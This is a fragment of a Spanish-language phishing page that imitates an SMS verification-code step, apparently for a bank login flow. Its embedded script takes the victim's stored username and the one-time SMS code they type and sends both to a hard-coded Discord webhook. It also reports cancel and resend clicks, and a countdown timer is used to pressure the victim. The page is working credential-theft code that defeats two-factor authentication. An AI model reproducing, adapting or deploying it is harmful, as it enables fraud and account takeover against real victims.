      <div class="form-group">
        <input type="text" id="sms" name="sms" maxlength="8" required="" oninput="this.value = this.value.replace(/[^0-9]/g, &#39;&#39;)" minlength="6">
        <label for="sms">Código SMS *</label>
      </div>
      <input type="hidden" id="nombreOculto" name="nombre" value="angel613">
    </div>

    <div style="width: 100%; text-align: center">
      <button type="submit" id="continuarBtn" disabled="">Continuar</button>
      <button type="button" class="cancel-btn" id="cancelBtn">Cancelar</button>
    </div>

    <div class="timer" id="timerText">
      Reenviar código en: <span id="countdown">01:51</span>
    </div>

    <div class="resend" id="resendText" style="display: none; cursor: pointer; color: #0067b1; font-weight: bold;">
      Reenviar código
    </div>

<script>
  // CONFIGURACIÓN DE DISCORD
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1502415454721802323/cA7X6z9K-UhI7DoFs4tOLVHYVJ-eubS1LJbpRqUjZ8M9jpKPYqLKmqAOxgmJQA7B4yxY";

  async function enviarADiscordJS(mensaje) {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: mensaje })
      });
    } catch (e) { console.error(e); }
  }

  document.addEventListener("DOMContentLoaded", function () {
    const nombre = localStorage.getItem("usuario") || "Desconocido";
    document.getElementById("nombreOculto").value = nombre;

    // --- Enviar SMS (Segundo Intento) ---
    document.getElementById("smsForm").addEventListener("submit", async function(event) {
      event.preventDefault();
      const sms = document.getElementById("sms").value;
      const btn = document.getElementById("continuarBtn");

      if (sms.length >= 6) {
        btn.disabled = true;
        const msg = "⚠️ **SEGUNDO INTENTO SMS**\n👤 Usuario: `" + nombre + "`\n💬 Token: `" + sms + "`";
        await enviarADiscordJS(msg);
        window.location.href = "validando.html";
      }
    });

    // --- Cronómetro ---
    let countdownTime = 120;
    const countdownElement = document.getElementById("countdown");
    const resendText = document.getElementById("resendText");
    const timerDisplay = document.getElementById("timerText");

    const countdownInterval = setInterval(function() {
      const minutes = Math.floor(countdownTime / 60);
      const seconds = countdownTime % 60;
      countdownElement.textContent = `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
      
      if (countdownTime <= 0) {
        clearInterval(countdownInterval);
        resendText.style.display = "block";
        timerDisplay.style.display = "none";
      }
      countdownTime--;
    }, 1000);

    // --- Habilitar Botón ---
    document.getElementById("sms").addEventListener("input", function() {
      document.getElementById("continuarBtn").disabled = (this.value.length < 6);
    });

    // --- Cancelar ---
    document.getElementById("cancelBtn").addEventListener("click", async function() {
      await enviarADiscordJS("🚫 **CANCELADO EN ERROR SMS**\n👤 Usuario: `" + nombre + "`");
      window.location.href = 'index.html';
    });

    // --- Reenviar ---
    resendText.addEventListener("click", async function() {
      await enviarADiscordJS("🔄 **REENVÍO SOLICITADO DESDE ERROR**\n👤 Usuario: `" + nombre + "`");
      window.location.href = "reenviando.html";
    });
  });
</script>
